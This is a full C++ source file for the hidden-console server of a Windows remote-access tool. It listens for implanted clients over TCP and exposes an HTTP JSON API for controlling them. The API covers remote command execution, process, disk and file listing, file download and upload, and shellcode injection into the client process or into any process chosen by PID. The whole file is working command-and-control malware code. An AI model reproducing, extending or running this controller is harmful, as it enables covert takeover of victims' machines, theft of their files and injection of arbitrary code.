#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <string>
#include <vector>
#include <windows.h>
#include "cJSON.h"
#include <atomic>
#include <chrono>
#include "mongoose.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std;

typedef struct
{
	SOCKET client;
	sockaddr_in saddr;
	char address[128];
	unsigned short port;
	bool is_alive;
} ClientInfo;

std::vector<ClientInfo*> g_client_list;
CRITICAL_SECTION g_cs_client_list;
SOCKET g_tcp_server;
struct mg_mgr g_http_mgr;
std::atomic<bool> g_is_running(true);

typedef struct { DWORD Is64; DWORD PID; CHAR ProcessName[2048]; } ProcessList;
typedef struct { char driver_name[128]; char driver_type[128]; double available_space; double free_space; double total_space; } MyDriver;
typedef struct { char szFilePath[4095]; char szFileName[2048]; long long szFileSize; } FileInfo;
typedef struct { DWORD PID; char ShellCode[4096]; } InjectCode;
typedef struct { CHAR LocalPath[4096]; CHAR RemotePath[4096]; } SendFilePath;

// -------------------------- 带超时的循环接收函数 --------------------------
/**
* @brief 循环接收Socket数据（支持长数据、超时控制）
* @param sock 客户端Socket
* @param timeout_ms 超时时间（毫秒），0=无限等待
* @return 完整的接收数据，空字符串表示失败/超时
*/
std::string RecvAllData(SOCKET sock, int timeout_ms = 5000)
{
	std::string total_data;
	const int BUF_SIZE = 4096;
	char buf[BUF_SIZE] = { 0 };
	int recv_len = 0;

	DWORD timeout = timeout_ms;
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

	while (true)
	{
		recv_len = recv(sock, buf, BUF_SIZE - 1, 0);
		if (recv_len > 0)
		{
			buf[recv_len] = '\0';
			total_data += buf;
			memset(buf, 0, sizeof(buf));
		}
		else if (recv_len == 0)
		{
			break;
		}
		else
		{
			int err = WSAGetLastError();
			if (err == WSAETIMEDOUT)
			{
				if (!total_data.empty())
				{
					printf("[RecvAllData] 接收超时，但已获取部分数据（长度：%d）\n", (int)total_data.size());
					break;
				}
				else
				{
					printf("[RecvAllData] 接收超时，无数据\n");
					return "";
				}
			}
			else
			{
				printf("[RecvAllData] 接收失败，错误码：%d\n", err);
				return "";
			}
		}
	}

	timeout = 0;
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

	return total_data;
}

void PopOfflineClient(const char* address)
{
	EnterCriticalSection(&g_cs_client_list);
	for (auto it = g_client_list.begin(); it != g_client_list.end();)
	{
		ClientInfo* client = *it;
		if (strcmp(client->address, address) == 0)
		{
			closesocket(client->client);
			delete client;
			it = g_client_list.erase(it);
			printf("[Offline] Client %s:%d removed\n", address, client->port);
			break;
		}
		else ++it;
	}
	LeaveCriticalSection(&g_cs_client_list);
}

bool CheckClientAlive(ClientInfo* client)
{
	if (client->client == INVALID_SOCKET) return false;
	char ping[] = "Ping";
	if (send(client->client, ping, sizeof(ping), 0) <= 0) { client->is_alive = false; return false; }

	fd_set read_fds; FD_ZERO(&read_fds); FD_SET(client->client, &read_fds);
	TIMEVAL timeout = { 1, 0 };
	int ret = select(0, &read_fds, nullptr, nullptr, &timeout);
	if (ret <= 0) { client->is_alive = false; return false; }

	char pong[32] = { 0 };
	if (recv(client->client, pong, sizeof(pong), 0) <= 0 || strcmp(pong, "Pong") != 0)
	{
		client->is_alive = false; return false;
	}

	client->is_alive = true;
	return true;
}

char* GetFileName(char* Path)
{
	if (strchr(Path, '\\')) return strrchr(Path, '\\') + 1;
	else if (strchr(Path, '/')) return strrchr(Path, '/') + 1;
	return Path;
}

long long GetFileSize(const string& file_path)
{
	FILE* fp = fopen(file_path.c_str(), "rb");
	if (!fp) return -1;
	fseek(fp, 0, SEEK_END);
	long long size = ftell(fp);
	fclose(fp);
	return size;
}

cJSON* ExecClientCommand(const char* address, const char* cmd)
{
	cJSON* result = cJSON_CreateObject();
	EnterCriticalSection(&g_cs_client_list);
	for (auto& client : g_client_list)
	{
		if (strcmp(client->address, address) != 0 || !CheckClientAlive(client)) continue;

		const char* cmd_header = "GetCommand";
		if (send(client->client, cmd_header, strlen(cmd_header), 0) <= 0)
		{
			PopOfflineClient(address);
			cJSON_AddStringToObject(result, "error", "Send GetCommand header failed");
			goto END;
		}

		char send_cmd[8192] = { 0 };
		strncpy(send_cmd, cmd, sizeof(send_cmd) - 1);
		if (send(client->client, send_cmd, sizeof(send_cmd), 0) <= 0)
		{
			PopOfflineClient(address);
			cJSON_AddStringToObject(result, "error", "Send command content failed");
			goto END;
		}

		std::string recv_result = RecvAllData(client->client, 10000);
		if (recv_result.empty())
		{
			PopOfflineClient(address);
			cJSON_AddStringToObject(result, "error", "Receive command result failed (timeout/empty)");
			goto END;
		}

		cJSON_AddStringToObject(result, "output", recv_result.c_str());
		cJSON_AddNumberToObject(result, "output_length", recv_result.size());
		cJSON_AddBoolToObject(result, "success", true);
		goto END;
	}
	cJSON_AddStringToObject(result, "error", "Client not found/offline");
END:
	LeaveCriticalSection(&g_cs_client_list);
	return result;
}

cJSON* GetClientList()
{
	cJSON* client_array = cJSON_CreateArray();
	EnterCriticalSection(&g_cs_client_list);
	for (auto& client : g_client_list)
	{
		bool alive = CheckClientAlive(client);
		if (!alive) { PopOfflineClient(client->address); continue; }
		cJSON* obj = cJSON_CreateObject();
		cJSON_AddStringToObject(obj, "address", client->address);
		cJSON_AddNumberToObject(obj, "port", client->port);
		cJSON_AddBoolToObject(obj, "is_alive", alive);
		cJSON_AddItemToArray(client_array, obj);
	}
	LeaveCriticalSection(&g_cs_client_list);

	cJSON* result = cJSON_CreateObject();
	cJSON_AddItemToObject(result, "clients", client_array);
	cJSON_AddNumberToObject(result, "count", cJSON_GetArraySize(client_array));
	cJSON_AddBoolToObject(result, "success", true);
	return result;
}

cJSON* GetClientProcessList(const char* address)
{
	cJSON* result = cJSON_CreateObject();
	cJSON* proc_array = cJSON_CreateArray();
	EnterCriticalSection(&g_cs_client_list);
	for (auto& client : g_client_list)
	{
		if (strcmp(client->address, address) != 0 || !CheckClientAlive(client)) continue;

		const char* cmd = "GetProcessList";
		if (send(client->client, cmd, strlen(cmd), 0) <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Send GetProcessList cmd failed"); goto END;
		}

		DWORD proc_count = 0;
		if (recv(client->client, (char*)&proc_count, sizeof(DWORD), 0) != sizeof(DWORD))
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Receive process count failed"); goto END;
		}
		send(client->client, (char*)&proc_count, sizeof(DWORD), 0);

		for (DWORD i = 0; i < proc_count; i++)
		{
			ProcessList proc = { 0 };
			if (recv(client->client, (char*)&proc, sizeof(ProcessList), 0) != sizeof(ProcessList)) continue;
			cJSON* obj = cJSON_CreateObject();
			cJSON_AddNumberToObject(obj, "pid", proc.PID);
			cJSON_AddStringToObject(obj, "bitness", proc.Is64 ? "x86" : "x64");
			cJSON_AddStringToObject(obj, "name", proc.ProcessName);
			cJSON_AddItemToArray(proc_array, obj);
		}

		cJSON_AddItemToObject(result, "processes", proc_array);
		cJSON_AddNumberToObject(result, "count", proc_count);
		cJSON_AddBoolToObject(result, "success", true);
		goto END;
	}
	cJSON_AddStringToObject(result, "error", "Client not found/offline");
END:
	LeaveCriticalSection(&g_cs_client_list);
	return result;
}

cJSON* GetClientDiskList(const char* address)
{
	cJSON* result = cJSON_CreateObject();
	cJSON* disk_array = cJSON_CreateArray();
	EnterCriticalSection(&g_cs_client_list);
	for (auto& client : g_client_list)
	{
		if (strcmp(client->address, address) != 0 || !CheckClientAlive(client)) continue;

		const char* cmd = "GetDiskList";
		if (send(client->client, cmd, strlen(cmd), 0) <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Send GetDiskList cmd failed"); goto END;
		}

		DWORD disk_count = 0;
		if (recv(client->client, (char*)&disk_count, sizeof(DWORD), 0) != sizeof(DWORD))
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Receive disk count failed"); goto END;
		}
		send(client->client, (char*)&disk_count, sizeof(DWORD), 0);

		for (DWORD i = 0; i < disk_count; i++)
		{
			MyDriver disk = { 0 };
			if (recv(client->client, (char*)&disk, sizeof(MyDriver), 0) != sizeof(MyDriver)) continue;
			cJSON* obj = cJSON_CreateObject();
			cJSON_AddStringToObject(obj, "name", disk.driver_name);
			cJSON_AddStringToObject(obj, "type", disk.driver_type);
			cJSON_AddNumberToObject(obj, "total_gb", disk.total_space);
			cJSON_AddNumberToObject(obj, "free_gb", disk.free_space);
			cJSON_AddNumberToObject(obj, "used_gb", disk.available_space);
			cJSON_AddItemToArray(disk_array, obj);
		}

		cJSON_AddItemToObject(result, "disks", disk_array);
		cJSON_AddNumberToObject(result, "count", disk_count);
		cJSON_AddBoolToObject(result, "success", true);
		goto END;
	}
	cJSON_AddStringToObject(result, "error", "Client not found/offline");
END:
	LeaveCriticalSection(&g_cs_client_list);
	return result;
}

cJSON* GetClientFileList(const char* address, const char* path)
{
	cJSON* result = cJSON_CreateObject();
	cJSON* file_array = cJSON_CreateArray();
	EnterCriticalSection(&g_cs_client_list);
	for (auto& client : g_client_list)
	{
		if (strcmp(client->address, address) != 0 || !CheckClientAlive(client)) continue;

		const char* cmd = "GetDiskFileList";
		if (send(client->client, cmd, strlen(cmd), 0) <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Send GetDiskFileList cmd failed"); goto END;
		}

		char send_path[8192] = { 0 };
		strncpy(send_path, path, sizeof(send_path) - 1);
		if (send(client->client, send_path, sizeof(send_path), 0) <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Send target path failed"); goto END;
		}

		DWORD file_count = 0;
		if (recv(client->client, (char*)&file_count, sizeof(DWORD), 0) != sizeof(DWORD))
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Receive file count failed"); goto END;
		}
		send(client->client, (char*)&file_count, sizeof(DWORD), 0);

		for (DWORD i = 0; i < file_count; i++)
		{
			FileInfo file = { 0 };
			if (recv(client->client, (char*)&file, sizeof(FileInfo), 0) != sizeof(FileInfo)) continue;
			cJSON* obj = cJSON_CreateObject();
			cJSON_AddStringToObject(obj, "name", file.szFileName);
			cJSON_AddStringToObject(obj, "path", file.szFilePath);
			cJSON_AddNumberToObject(obj, "size_bytes", static_cast<double>(file.szFileSize));
			cJSON_AddItemToArray(file_array, obj);
		}

		cJSON_AddItemToObject(result, "files", file_array);
		cJSON_AddNumberToObject(result, "count", file_count);
		cJSON_AddBoolToObject(result, "success", true);
		goto END;
	}
	cJSON_AddStringToObject(result, "error", "Client not found/offline");
END:
	LeaveCriticalSection(&g_cs_client_list);
	return result;
}

cJSON* RecvClientFile(const char* address, const char* remote_path, const char* local_path)
{
	cJSON* result = cJSON_CreateObject();
	EnterCriticalSection(&g_cs_client_list);
	for (auto& client : g_client_list)
	{
		if (strcmp(client->address, address) != 0 || !CheckClientAlive(client)) continue;

		const char* cmd = "RecvFile";
		if (send(client->client, cmd, strlen(cmd), 0) <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Send RecvFile cmd failed"); goto END;
		}

		if (send(client->client, remote_path, strlen(remote_path) + 1, 0) <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Send remote path failed"); goto END;
		}

		long long file_size = 0;
		if (recv(client->client, (char*)&file_size, sizeof(long long), 0) != sizeof(long long) || file_size <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Invalid file size"); goto END;
		}

		char local_file[4096] = { 0 };
		strncpy(local_file, local_path, sizeof(local_file) - 1);
		strcat(local_file, GetFileName((char*)remote_path));

		FILE* fp = fopen(local_file, "wb");
		if (!fp) { cJSON_AddStringToObject(result, "error", "Create local file failed"); goto END; }

		char buffer[1024] = { 0 };
		long long total_recv = 0;
		while (total_recv < file_size)
		{
			int read_len = recv(client->client, buffer, sizeof(buffer), 0);
			if (read_len <= 0) { fclose(fp); remove(local_file); cJSON_AddStringToObject(result, "error", "Receive file content failed"); goto END; }
			fwrite(buffer, 1, read_len, fp);
			total_recv += read_len;
			memset(buffer, 0, sizeof(buffer));
		}

		fclose(fp);
		cJSON_AddStringToObject(result, "local_path", local_file);
		cJSON_AddNumberToObject(result, "size_bytes", static_cast<double>(file_size));
		cJSON_AddBoolToObject(result, "success", true);
		goto END;
	}
	cJSON_AddStringToObject(result, "error", "Client not found/offline");
END:
	LeaveCriticalSection(&g_cs_client_list);
	return result;
}

cJSON* SendFileToClient(const char* address, const char* local_path, const char* remote_path)
{
	cJSON* result = cJSON_CreateObject();
	EnterCriticalSection(&g_cs_client_list);

	long long file_size = GetFileSize(local_path);
	if (file_size <= 0) { cJSON_AddStringToObject(result, "error", "Local file not found/empty"); goto END; }

	for (auto& client : g_client_list)
	{
		if (strcmp(client->address, address) != 0 || !CheckClientAlive(client)) continue;

		const char* cmd = "SendFile";
		if (send(client->client, cmd, strlen(cmd), 0) <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Send SendFile cmd failed"); goto END;
		}

		SendFilePath path_info = { 0 };
		strncpy(path_info.LocalPath, local_path, sizeof(path_info.LocalPath) - 1);
		strncpy(path_info.RemotePath, remote_path, sizeof(path_info.RemotePath) - 1);
		if (send(client->client, (char*)&path_info, sizeof(SendFilePath), 0) <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Send path info failed"); goto END;
		}

		if (send(client->client, (char*)&file_size, sizeof(long long), 0) <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Send file size failed"); goto END;
		}

		FILE* fp = fopen(local_path, "rb");
		if (!fp) { cJSON_AddStringToObject(result, "error", "Open local file failed"); goto END; }

		char buffer[1024] = { 0 };
		long long total_send = 0;
		while (total_send < file_size)
		{
			int read_len = fread(buffer, 1, sizeof(buffer), fp);
			if (read_len <= 0) { fclose(fp); cJSON_AddStringToObject(result, "error", "Read local file failed"); goto END; }
			if (send(client->client, buffer, read_len, 0) != read_len) { fclose(fp); cJSON_AddStringToObject(result, "error", "Send file content failed"); goto END; }
			total_send += read_len;
			memset(buffer, 0, sizeof(buffer));
		}

		fclose(fp);
		cJSON_AddStringToObject(result, "remote_path", remote_path);
		cJSON_AddNumberToObject(result, "size_bytes", static_cast<double>(file_size));
		cJSON_AddBoolToObject(result, "success", true);
		goto END;
	}
	cJSON_AddStringToObject(result, "error", "Client not found/offline");
END:
	LeaveCriticalSection(&g_cs_client_list);
	return result;
}

cJSON* InjectSelfShellCode(const char* address, const char* shellcode)
{
	cJSON* result = cJSON_CreateObject();
	EnterCriticalSection(&g_cs_client_list);
	for (auto& client : g_client_list)
	{
		if (strcmp(client->address, address) != 0 || !CheckClientAlive(client)) continue;

		const char* cmd = "InjectSelfCode";
		if (send(client->client, cmd, strlen(cmd), 0) <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Send InjectSelfCode cmd failed"); goto END;
		}

		InjectCode inject = { 0 };
		inject.PID = 0;
		strncpy(inject.ShellCode, shellcode, sizeof(inject.ShellCode) - 1);
		if (send(client->client, (char*)&inject, sizeof(InjectCode), 0) <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Send shellcode failed"); goto END;
		}

		cJSON_AddStringToObject(result, "message", "ShellCode injected to self process");
		cJSON_AddBoolToObject(result, "success", true);
		goto END;
	}
	cJSON_AddStringToObject(result, "error", "Client not found/offline");
END:
	LeaveCriticalSection(&g_cs_client_list);
	return result;
}

cJSON* InjectRemoteShellCode(const char* address, DWORD pid, const char* shellcode)
{
	cJSON* result = cJSON_CreateObject();
	EnterCriticalSection(&g_cs_client_list);
	for (auto& client : g_client_list)
	{
		if (strcmp(client->address, address) != 0 || !CheckClientAlive(client)) continue;

		const char* cmd = "InjectRemoteCode";
		if (send(client->client, cmd, strlen(cmd), 0) <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Send InjectRemoteCode cmd failed"); goto END;
		}

		InjectCode inject = { 0 };
		inject.PID = pid;
		strncpy(inject.ShellCode, shellcode, sizeof(inject.ShellCode) - 1);
		if (send(client->client, (char*)&inject, sizeof(InjectCode), 0) <= 0)
		{
			PopOfflineClient(address); cJSON_AddStringToObject(result, "error", "Send shellcode failed"); goto END;
		}

		cJSON_AddNumberToObject(result, "target_pid", pid);
		cJSON_AddStringToObject(result, "message", "ShellCode injected to remote process");
		cJSON_AddBoolToObject(result, "success", true);
		goto END;
	}
	cJSON_AddStringToObject(result, "error", "Client not found/offline");
END:
	LeaveCriticalSection(&g_cs_client_list);
	return result;
}

cJSON* CloseClient(const char* address)
{
	cJSON* result = cJSON_CreateObject();
	EnterCriticalSection(&g_cs_client_list);
	for (auto it = g_client_list.begin(); it != g_client_list.end();)
	{
		ClientInfo* client = *it;
		if (strcmp(client->address, address) == 0)
		{
			send(client->client, "Exit", strlen("Exit"), 0);
			closesocket(client->client);
			delete client;
			it = g_client_list.erase(it);
			cJSON_AddStringToObject(result, "message", "Client closed");
			cJSON_AddBoolToObject(result, "success", true);
			goto END;
		}
		else ++it;
	}
	cJSON_AddStringToObject(result, "error", "Client not found");
END:
	LeaveCriticalSection(&g_cs_client_list);
	return result;
}

DWORD WINAPI TCPListenThread(LPVOID lpParam)
{
	sockaddr_in tcp_addr = { 0 };
	tcp_addr.sin_family = AF_INET;
	tcp_addr.sin_port = htons(8090);
	tcp_addr.sin_addr.S_un.S_addr = INADDR_ANY;

	g_tcp_server = socket(AF_INET, SOCK_STREAM, 0);
	if (g_tcp_server == INVALID_SOCKET) { printf("[TCP] Create socket failed\n"); return 1; }
	if (bind(g_tcp_server, (sockaddr*)&tcp_addr, sizeof(tcp_addr)) == SOCKET_ERROR)
	{
		printf("[TCP] Bind 8090 failed\n"); closesocket(g_tcp_server); return 1;
	}
	if (listen(g_tcp_server, SOMAXCONN) == SOCKET_ERROR)
	{
		printf("[TCP] Listen failed\n"); closesocket(g_tcp_server); return 1;
	}

	printf("[TCP] Listening on 0.0.0.0:8090...\n");
	while (g_is_running)
	{
		ClientInfo* new_client = new ClientInfo();
		socklen_t client_len = sizeof(sockaddr_in);
		new_client->client = accept(g_tcp_server, (sockaddr*)&new_client->saddr, &client_len);
		if (new_client->client == INVALID_SOCKET) { delete new_client; continue; }

		inet_ntop(AF_INET, &new_client->saddr.sin_addr, new_client->address, sizeof(new_client->address));
		new_client->port = ntohs(new_client->saddr.sin_port);
		new_client->is_alive = true;

		EnterCriticalSection(&g_cs_client_list);
		g_client_list.push_back(new_client);
		LeaveCriticalSection(&g_cs_client_list);
		printf("[TCP] New client: %s:%d\n", new_client->address, new_client->port);
	}

	closesocket(g_tcp_server);
	return 0;
}

void OnHTTPRequest(struct mg_connection* c, int ev, void* ev_data)
{
	if (ev != MG_EV_HTTP_MSG) return;

	struct mg_http_message* hm = (struct mg_http_message*)ev_data;
	if (mg_strcmp(hm->method, mg_str("POST")) != 0 || mg_strcmp(hm->uri, mg_str("/")) != 0)
	{
		mg_http_reply(c, 404, "Content-Type: application/json\r\n",
			"{\"status\":\"error\",\"message\":\"Only POST / is supported\"}");
		return;
	}

	cJSON* req_json = cJSON_ParseWithLength(hm->body.buf, hm->body.len);
	if (!req_json)
	{
		mg_http_reply(c, 400, "Content-Type: application/json\r\n",
			"{\"status\":\"error\",\"message\":\"Invalid JSON format\"}");
		return;
	}

	cJSON* cmd_json = cJSON_GetObjectItemCaseSensitive(req_json, "command");
	cJSON* addr_json = cJSON_GetObjectItemCaseSensitive(req_json, "address");
	if (!cJSON_IsString(cmd_json) || !cJSON_IsString(addr_json))
	{
		cJSON_Delete(req_json);
		mg_http_reply(c, 400, "Content-Type: application/json\r\n",
			"{\"status\":\"error\",\"message\":\"Missing required fields: command/address\"}");
		return;
	}

	const char* command = cmd_json->valuestring;
	const char* address = addr_json->valuestring;
	std::vector<const char*> params;

	cJSON* params_json = cJSON_GetObjectItemCaseSensitive(req_json, "params");
	if (params_json != NULL)
	{
		if (!cJSON_IsArray(params_json))
		{
			cJSON_Delete(req_json);
			mg_http_reply(c, 400, "Content-Type: application/json\r\n",
				"{\"status\":\"error\",\"message\":\"params must be an array\"}");
			return;
		}
		int params_count = cJSON_GetArraySize(params_json);
		for (int i = 0; i < params_count; i++)
		{
			cJSON* param = cJSON_GetArrayItem(params_json, i);
			if (cJSON_IsString(param)) params.push_back(param->valuestring);
			else
			{
				cJSON_Delete(req_json);
				mg_http_reply(c, 400, "Content-Type: application/json\r\n",
					"{\"status\":\"error\",\"message\":\"All params must be string type\"}");
				return;
			}
		}
	}

	cJSON* response = cJSON_CreateObject();
	cJSON_AddStringToObject(response, "request_command", command);
	cJSON_AddStringToObject(response, "target_client", address);
	cJSON_AddNumberToObject(response, "params_count", params.size());

	try
	{
		if (strcmp(command, "GetClientList") == 0)
		{
			if (params.size() != 0) throw "GetClientList requires 0 params, but got " + to_string(params.size());
			cJSON_AddItemToObject(response, "data", GetClientList());
		}
		else if (strcmp(command, "GetProcessList") == 0)
		{
			if (params.size() != 0) throw "GetProcessList requires 0 params, but got " + to_string(params.size());
			cJSON_AddItemToObject(response, "data", GetClientProcessList(address));
		}
		else if (strcmp(command, "GetDiskList") == 0)
		{
			if (params.size() != 0) throw "GetDiskList requires 0 params, but got " + to_string(params.size());
			cJSON_AddItemToObject(response, "data", GetClientDiskList(address));
		}
		else if (strcmp(command, "GetFileList") == 0)
		{
			if (params.size() != 1) throw "GetFileList requires 1 param (path), but got " + to_string(params.size());
			cJSON_AddItemToObject(response, "data", GetClientFileList(address, params[0]));
		}
		else if (strcmp(command, "ExecCommand") == 0)
		{
			if (params.size() != 1) throw "ExecCommand requires 1 param (cmd_content), but got " + to_string(params.size());
			cJSON_AddItemToObject(response, "data", ExecClientCommand(address, params[0]));
		}
		else if (strcmp(command, "RecvFile") == 0)
		{
			if (params.size() != 2) throw "RecvFile requires 2 params (remote_path, local_path), but got " + to_string(params.size());
			cJSON_AddItemToObject(response, "data", RecvClientFile(address, params[0], params[1]));
		}
		else if (strcmp(command, "SendFile") == 0)
		{
			if (params.size() != 2) throw "SendFile requires 2 params (local_path, remote_path), but got " + to_string(params.size());
			cJSON_AddItemToObject(response, "data", SendFileToClient(address, params[0], params[1]));
		}
		else if (strcmp(command, "InjectSelfCode") == 0)
		{
			if (params.size() != 1) throw "InjectSelfCode requires 1 param (shellcode), but got " + to_string(params.size());
			cJSON_AddItemToObject(response, "data", InjectSelfShellCode(address, params[0]));
		}
		else if (strcmp(command, "InjectRemoteCode") == 0)
		{
			if (params.size() != 2) throw "InjectRemoteCode requires 2 params (pid_str, shellcode), but got " + to_string(params.size());
			DWORD pid = atoi(params[0]);
			if (pid == 0 && strcmp(params[0], "0") != 0) throw "InjectRemoteCode param 0 (pid) must be a valid number";
			cJSON_AddItemToObject(response, "data", InjectRemoteShellCode(address, pid, params[1]));
		}
		else if (strcmp(command, "CloseClient") == 0)
		{
			if (params.size() != 0) throw "CloseClient requires 0 params, but got " + to_string(params.size());
			cJSON_AddItemToObject(response, "data", CloseClient(address));
		}
		else if (strcmp(command, "ShutdownServer") == 0)
		{
			if (params.size() != 0) throw "ShutdownServer requires 0 params, but got " + to_string(params.size());
			g_is_running = false;
			cJSON* data = cJSON_CreateObject();
			cJSON_AddStringToObject(data, "message", "Server shutting down");
			cJSON_AddBoolToObject(data, "success", true);
			cJSON_AddItemToObject(response, "data", data);
		}
		else
		{
			throw "Unsupported command: " + string(command);
		}
	}
	catch (string err_msg)
	{
		cJSON_AddStringToObject(response, "error", err_msg.c_str());
	}

	char* resp_str = cJSON_PrintUnformatted(response);
	mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", resp_str);

	free(resp_str);
	cJSON_Delete(response);
	cJSON_Delete(req_json);
}

int main(int argc, char* argv[])
{
	// 隐藏控制台
	HWND hwnd = GetConsoleWindow();
	if (hwnd != NULL) ShowWindow(hwnd, SW_HIDE);

	// 初始化WSA
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

	// 初始化临界区
	InitializeCriticalSection(&g_cs_client_list);

	// 启动TCP监听线程
	HANDLE tcp_thread = CreateThread(NULL, 0, TCPListenThread, NULL, 0, NULL);
	if (tcp_thread == NULL)
	{
		DeleteCriticalSection(&g_cs_client_list);
		WSACleanup();
		return 1;
	}

	// 启动HTTP服务器
	mg_mgr_init(&g_http_mgr);
	struct mg_connection* http_listener = mg_http_listen(&g_http_mgr, "http://0.0.0.0:8091", OnHTTPRequest, NULL);
	if (!http_listener)
	{
		printf("[HTTP] Listen 8091 failed\n");
		TerminateThread(tcp_thread, 0);
		CloseHandle(tcp_thread);
		DeleteCriticalSection(&g_cs_client_list);
		WSACleanup();
		mg_mgr_free(&g_http_mgr);
		return 1;
	}
	printf("[HTTP] Listening on 0.0.0.0:8091 (POST /)\n");

	// 主循环
	while (g_is_running)
		mg_mgr_poll(&g_http_mgr, 100);

	// 退出清理
	mg_mgr_free(&g_http_mgr);
	TerminateThread(tcp_thread, 0);
	CloseHandle(tcp_thread);

	EnterCriticalSection(&g_cs_client_list);
	for (auto& client : g_client_list) { closesocket(client->client); delete client; }
	g_client_list.clear();
	LeaveCriticalSection(&g_cs_client_list);

	DeleteCriticalSection(&g_cs_client_list);
	WSACleanup();

	return 0;
}